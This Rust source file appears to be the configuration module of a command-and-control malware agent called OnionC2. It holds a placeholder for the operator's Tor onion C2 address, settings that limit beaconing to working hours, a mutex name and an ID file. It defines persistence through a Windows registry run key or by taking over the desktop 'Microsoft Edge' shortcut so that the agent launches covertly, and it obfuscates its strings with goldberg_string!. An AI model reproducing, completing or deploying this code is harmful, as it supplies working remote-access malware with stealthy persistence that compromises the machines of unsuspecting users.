use goldberg::{goldberg_string};
use jiff::{civil, tz, Zoned};

use crate::debug_println;

// - - - - - - - - - - <COMMUNICATIONS> - - - - - - - - - -

// Onion domain of your C2 server.
#[inline]
pub fn get_address() -> String {
    // Put your onion domain here!!!
    goldberg_string!("").to_string()
}

// - - - - - - - - - - </COMMUNICATIONS> - - - - - - - - - -

// - - - - - - - - - - <ACTIVE HOURS> - - - - - - - - - -

// Specifies if an agent has specific active hours.
// If set to false then agent would reach out to C2
// each time it ticks in the main loop. If set to
// true then it would skip reaching out to the C2
// server if that moment is outside of specified
// time frames (accounted for timezone).
#[inline]
fn get_active_hours_enabled() -> bool {
    false
}

// Specifies time frames in which an agent is supposed
// to reach out. Basically working hours...
#[inline]
fn get_active_hours_daily_time_frames() -> Vec<String> {
    vec![
        goldberg_string!("9am-12pm").to_string(),
        goldberg_string!("1pm-5pm").to_string(),
    ]
}

// Specifies the timezone in which active hours time
// frames should be calculated against.
#[inline]
fn get_active_hours_timezone() -> String {
    // For Central European Summer Time (CEST).
    goldberg_string!("Europe/Berlin").to_string()
}

#[inline]
fn parse_time(s: &str) -> Result<civil::Time, jiff::Error> {
    let s_upper = s.to_uppercase();
    if s.contains(":") {
        return civil::Time::strptime("%I:%M%p", &s_upper);
    }
    return civil::Time::strptime("%I%p", &s_upper);
}

// This function dictates to the agent's main loop
// if reaching out to the C2 server should be skipped
// or not. Any error would result in reaching out to
// the C2 server.
#[inline]
pub fn get_should_be_active() -> bool {
    let has_active_hours = get_active_hours_enabled();
    if !has_active_hours {
        debug_println!("active hours disabled");
        // Agent does not have active hours, therefore
        // it should reach out to the C2 server each
        // time.
        return true;
    }

    let time_frames = get_active_hours_daily_time_frames();
    let timezone_str = get_active_hours_timezone();

    let tz = match tz::TimeZone::get(&timezone_str) {
        Ok(t) => t,
        Err(e) => {
            debug_println!("timezone appears to be invalid: {}", e);
            // Invalid timezone, safely return false.
            return true;
        },
    };

    let now = Zoned::now().with_time_zone(tz.clone());

    let local_date = now.date();

    for frame in time_frames {
        let parts: Vec<&str> = frame.split('-').collect();
        if parts.len() != 2 {
            debug_println!("skipping malformed time frame: {}", frame);
            // Skip malformed time frames.
            continue;
        }
        let start_str = parts[0].trim();
        let end_str = parts[1].trim();

        debug_println!("checking time frame: {} and {}", start_str, end_str);

        let start_time = match parse_time(start_str) {
            Ok(t) => t,
            Err(e) => {
                debug_println!("failed to parse start time frame: {}", e);
                return true;
            },
        };

        let end_time = match parse_time(end_str) {
            Ok(t) => t,
            Err(e) => {
                debug_println!("failed to parse end time frame: {}", e);
                return true;
            },
        };

        let start_dt = match civil::DateTime::new(
            local_date.year(),
            local_date.month(),
            local_date.day(),
            start_time.hour(),
            start_time.minute(),
            start_time.second(),
            start_time.nanosecond().into()
        ) {
            Ok(dt) => dt,
            Err(e) => {
                debug_println!("failed to build a date from start_dt: {}", e);
                return true;
            },
        };

        let end_dt = match civil::DateTime::new(
            local_date.year(),
            local_date.month(),
            local_date.day(),
            end_time.hour(),
            end_time.minute(),
            end_time.second(),
            end_time.nanosecond().into()
        ) {
            Ok(dt) => dt,
            Err(e) => {
                debug_println!("failed to build a date from end_dt: {}", e);
                return true;
            },
        };

        let zoned_start_dt = match start_dt.to_zoned(tz.clone()) {
            Ok(dt) => dt,
            Err(e) => {
                debug_println!("failed to put start_dt into timezone: {}", e);
                return true;
            },
        };

        let zoned_end_dt = match end_dt.to_zoned(tz.clone()) {
            Ok(dt) => dt,
            Err(e) => {
                debug_println!("failed to put end_dt into timezone: {}", e);
                return true;
            },
        };

        debug_println!("time frames | now: {}, start: {}, end: {}", now, zoned_start_dt, zoned_end_dt);
        if now >= zoned_start_dt && now < zoned_end_dt {
            debug_println!("within the time frame");
            // Within active hours.
            return true;
        }
    }

    debug_println!("time frames weren't a match");
    false // Not within any active hours
}

// - - - - - - - - - - </ACTIVE HOURS> - - - - - - - - - -


// - - - - - - - - - - <MACHINE STUFF> - - - - - - - - - -

// Name of a file where an agent would keep its ID.
#[inline]
pub fn get_id_path() -> String {
    goldberg_string!("agent.id").to_string()
}

// Defines mutex name. Leave empty to disable the mutex.
// This mutex prevents multiple instances of an agent
// to run in parallel.
#[inline]
pub fn get_mutex_name() -> String {
    goldberg_string!("OnionC2AgentMutex").to_string()
}

// - - - - - - - - - - </MACHINE STUFF> - - - - - - - - - -

// - - - - - - - - - - <PERSISTENCE> - - - - - - - - - -

// Enum representing available persistence techniques.
// Do not modify, except when coding a new technique.
// For configuration purposes modify the "persistence"
// function.
#[allow(dead_code)]
pub enum Persistence {
    // No persistence at all.
    None,

    // Creates a registry record in order to make the
    // system run an agent on startup.
    WindowsRegistry,

    // Modifies or creates shortcut of a program to 
    // point to an agent in order to assure execution
    // when a user runs that shortcut. This would also 
    // run program to which shortcut was initially
    // pointing to. Highly recommended to enable mutex
    // utilization when relying on this technique.
    ShortcutTakeover,
}

// Specifies which persistence technique to use.
#[inline]
pub fn persistence() -> Persistence {
    return Persistence::ShortcutTakeover;
}

// Relates to Persistence::WinRegistryBased.
// Specifies name of the registry record.
#[inline]
pub fn get_reg_program_name() -> String {
    goldberg_string!("Agent").to_string()
}

// Relates to Persistence::ShortcutTakeover.
// Specifies which program would be run (apart from
// the agent) when you run the shortcut.
#[inline]
pub fn get_lnk_target_program_path() -> String {
    goldberg_string!("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe").to_string()
}

// Relates to Persistence::ShortcutTakeover.
// Specifies name of the shortcut. Shortcut
// is assumed to live on the desktop.
#[inline]
pub fn get_lnk_shortcut_name() -> String {
    goldberg_string!("Microsoft Edge").to_string()
}

// - - - - - - - - - - </PERSISTENCE> - - - - - - - - - -